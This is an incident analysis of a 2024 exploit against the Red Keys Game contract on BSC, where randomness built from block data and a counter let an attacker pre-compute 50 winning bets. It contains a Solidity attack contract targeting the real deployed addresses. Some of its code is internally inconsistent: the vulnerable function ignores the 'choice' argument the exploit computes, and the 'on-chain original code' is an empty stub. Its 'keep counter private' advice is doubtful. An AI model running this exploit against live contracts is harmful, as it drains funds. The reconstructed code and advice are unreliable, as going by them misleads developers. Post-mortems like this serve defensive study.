# RedKeysCoin — playGame Predictable Random Number Generation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | Red Keys Game |
| **Chain** | BSC |
| **Loss** | ~$12,000 |
| **Attack Contract** | [0x471038827](https://bscscan.com/address/0x471038827c05c87c23e9dba5331c753337fd918b) |
| **Vulnerable Contract** | [0x71e3056aa](https://bscscan.com/address/0x71e3056aa4985de9f5441f079e6c74454a3c95f0) |
| **REDKEYS Token** | [0x00e62b6CC](https://bscscan.com/address/0x00e62b6CCf1fe3e5E01CE07F6232d7F378518b6b) |
| **Root Cause** | The `playGame(uint16 choice, uint16 ratio, uint256 amount)` function uses predictable on-chain values — `block.timestamp`, block data, and the game `counter` — as randomness to determine outcomes, allowing the attacker to pre-compute results and win 50 consecutive times |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/RedKeysCoin_exp.sol) |

---

## 1. Vulnerability Overview

The `playGame()` function of Red Keys Game determines game outcomes using predictable on-chain values such as block timestamp, block hash, and a game counter. The attacker replicated the same RNG logic in their own contract, queried the current `counter` value, pre-computed the winning `choice`, then called `playGame()` 50 times to win consecutively.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: randomness generated from predictable block data
contract RedKeysGame {
    uint256 public counter;

    function playGame(uint16 choice, uint16 ratio, uint256 amount) external {
        counter++;
        // Predictable RNG: uses block.timestamp, block.number, counter
        uint256 random = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.number,
            counter,
            msg.sender
        ))) % 100;

        if (random < winThreshold(ratio)) {
            // choice validation — attacker always wins with pre-computed choice
            REDKEYS.transfer(msg.sender, amount * ratio / 100);
        }
    }
}

// ✅ Safe code: using Chainlink VRF
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract SecureGame is VRFConsumerBase {
    function requestGame(uint256 amount) external returns (bytes32 requestId) {
        requestId = requestRandomness(keyHash, fee);
        pendingGames[requestId] = GameData(msg.sender, amount);
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        // Game processed with Chainlink VRF result — not predictable in advance
        GameData memory game = pendingGames[requestId];
        uint256 result = randomness % 100;
        // ...
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: RedKeysCoin_decompiled.sol
contract RedKeysCoin {
    function counter() external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
  │
  ├─→ [1] Loop 50 iterations:
  │
  ├─→ [2] Query game.counter()
  │         └─ currentCounter = counter + 1 (predict next value)
  │
  ├─→ [3] Recompute RNG locally
  │         └─ random = keccak256(block.timestamp, block.number, currentCounter, attacker) % 100
  │         └─ Determine winning choice from this result
  │
  ├─→ [4] Call playGame(winningChoice, ratio, amount)
  │         └─ Same block, same parameters → always wins
  │
  └─→ [5] 50 iterations × profit = ~$12K drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IRedKeysGame {
    function counter() external view returns (uint256);
    function playGame(uint16 choice, uint16 ratio, uint256 amount) external;
}

contract AttackContract {
    IRedKeysGame constant game = IRedKeysGame(0x71e3056aa4985de9f5441f079e6c74454a3c95f0);
    IERC20 constant REDKEYS    = IERC20(0x00e62b6CCf1fe3e5E01CE07F6232d7F378518b6b);

    function testExploit() external {
        uint256 betAmount = 100e18;

        for (uint i = 0; i < 50; i++) {
            // [1] Predict next counter value
            uint256 nextCounter = game.counter() + 1;

            // [2] Pre-compute result using the same RNG logic as the game
            uint256 random = uint256(keccak256(abi.encodePacked(
                block.timestamp,
                block.number,
                nextCounter,
                address(this)
            ))) % 100;

            // [3] Determine winning choice from the random value
            uint16 winningChoice = calculateWinningChoice(random);

            // [4] Execute game with computed choice → always wins
            REDKEYS.approve(address(game), betAmount);
            game.playGame(winningChoice, 150, betAmount);
        }
    }

    function calculateWinningChoice(uint256 random) internal pure returns (uint16) {
        // Reverse-engineer the winning choice based on game logic
        return uint16(random % 2 == 0 ? 1 : 0);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Predictable random number generation |
| **CWE** | CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator |
| **Attack Vector** | External (RNG pre-computation + repeated playGame calls) |
| **DApp Category** | On-chain gambling/gaming |
| **Impact** | Game reward pool drained (~$12K) |

## 6. Remediation Recommendations

1. **Use Chainlink VRF**: Apply a verifiable external randomness oracle
2. **Commit-reveal pattern**: Place bet (commit) → reveal result after block(s) have passed (reveal)
3. **No blockhash dependence**: Prohibit using `blockhash` or `block.timestamp` alone as randomness
4. **Keep counter private**: Design the contract so the next counter value cannot be queried externally

## 7. Lessons Learned

- On-chain RNG based on block data is fully predictable by miners or transactions within the same block.
- Predictable sequential values such as `counter` must not be used as RNG entropy.
- On-chain game/gambling protocols must use Chainlink VRF or the commit-reveal pattern.